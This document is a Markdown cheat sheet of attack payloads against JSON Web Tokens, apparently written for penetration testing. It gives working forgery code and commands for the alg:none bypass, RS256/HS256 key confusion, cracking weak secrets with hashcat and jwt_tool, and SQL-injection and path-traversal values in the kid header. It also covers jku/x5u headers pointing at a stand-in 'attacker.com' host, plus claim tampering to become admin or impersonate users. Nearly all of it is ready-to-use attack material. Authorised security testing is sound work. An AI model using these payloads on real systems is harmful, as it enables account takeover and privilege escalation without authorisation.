# JWT Attack Payloads

> JWTs are often the key to privilege escalation. Always test algorithm confusion first — it's the most impactful and common.

---

## JWT Structure Reference

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header (base64)
.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9  ← Payload (base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature
```

Decode with: `echo "eyJ..." | base64 -d` or jwt.io

---

## Attack 1: Algorithm None

Set the algorithm to `none` to bypass signature verification entirely.

```json
// Modified header
{"alg":"none","typ":"JWT"}

// Modified payload (change role/user/admin)
{"user":"admin","role":"admin","sub":"1"}
```

Forge the token:
```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=').decode()

# Token with empty signature
token = f"{header}.{payload}."
print(token)
```

Variations:
```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

---

## Attack 2: HS256/RS256 Algorithm Confusion

If the server uses RS256 (asymmetric) but accepts HS256 (symmetric), sign with the **public key** as the HMAC secret.

```python
import jwt, requests

# Obtain the server's public key from JWKS endpoint
# GET /.well-known/jwks.json or /api/auth/keys

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Sign with RS256 public key AS IF it were an HS256 secret
malicious_token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(malicious_token)
```

---

## Attack 3: Weak Secret Brute Force

Common weak secrets to try:
```
secret
password
12345678
jwt_secret
mysecret
your-256-bit-secret
supersecret
secretkey
dev_secret
changeme
```

### Crack with hashcat
```bash
# JWT format for hashcat (mode 16500)
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# Custom wordlist
hashcat -a 0 -m 16500 "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UifQ.xxx" wordlist.txt
```

### Crack with jwt_tool
```bash
python3 jwt_tool.py [token] -C -d wordlist.txt
```

---

## Attack 4: `kid` (Key ID) Injection

If `kid` in the JWT header is used to look up the signing key from a database or filesystem:

### SQL Injection via kid
```json
{
  "alg": "HS256",
  "kid": "' UNION SELECT 'attacker_secret' -- "
}
```
Then sign with `attacker_secret` as the HMAC key.

### Directory Traversal via kid
```json
{
  "alg": "HS256",
  "kid": "../../dev/null"
}
```
Sign with empty string as the key (contents of /dev/null).

```json
{
  "alg": "HS256",
  "kid": "../../proc/self/fd/0"
}
```

---

## Attack 5: `jku` / `x5u` Header Injection

If the server fetches the public key from a URL in the JWT header:

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
```

Host a fake JWKS at `attacker.com/jwks.json` with your own key pair, then sign the JWT with your private key.

### Generate Key Pair + JWKS
```python
from jwcrypto import jwk
import json

key = jwk.JWK.generate(kty='RSA', size=2048)
public_jwks = {"keys": [json.loads(key.export_public())]}
print("JWKS:", json.dumps(public_jwks))
print("Private key:", key.export_private())
```

### `x5u` Variation
```json
{
  "alg": "RS256",
  "x5u": "https://attacker.com/cert.pem"
}
```

---

## Attack 6: Claim Tampering

After cracking or forging the signature, modify these common claims:

```json
// Privilege escalation
{"role": "admin"}
{"admin": true}
{"isAdmin": true}
{"scope": "admin"}
{"groups": ["admin", "superuser"]}

// User impersonation
{"sub": "1"}           ← change to another user's ID
{"user": "admin"}
{"email": "admin@target.com"}
{"userId": "00000001"}

// Expiry bypass
{"exp": 9999999999}    ← far future timestamp

// Audience bypass  
{"aud": "internal-api"}
```

---

## Attack 7: `kid` Path Traversal (File-Based Keys)

```json
{
  "alg": "HS256",
  "kid": "../../../../../../../dev/null"
}
```
Then sign with `""` (empty string) as HMAC secret — since /dev/null is empty.

```json
{
  "alg": "HS256",
  "kid": "/etc/hostname"
}
```
Sign with the contents of `/etc/hostname` as the secret (if you know it).

---

## jwt_tool Cheatsheet

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool && pip3 install -r requirements.txt

# Decode and check
python3 jwt_tool.py [token]

# Test for none algorithm
python3 jwt_tool.py [token] -X a

# Test for RS256/HS256 confusion (needs public key)
python3 jwt_tool.py [token] -X k -pk public.pem

# Crack secret
python3 jwt_tool.py [token] -C -d wordlist.txt

# Forge with known secret
python3 jwt_tool.py [token] -S hs256 -p "secretkey"

# Tamper payload and resign
python3 jwt_tool.py [token] -T -S hs256 -p "secretkey"

# Test jku injection
python3 jwt_tool.py [token] -X j

# Scan all attacks
python3 jwt_tool.py [token] -M pb
```
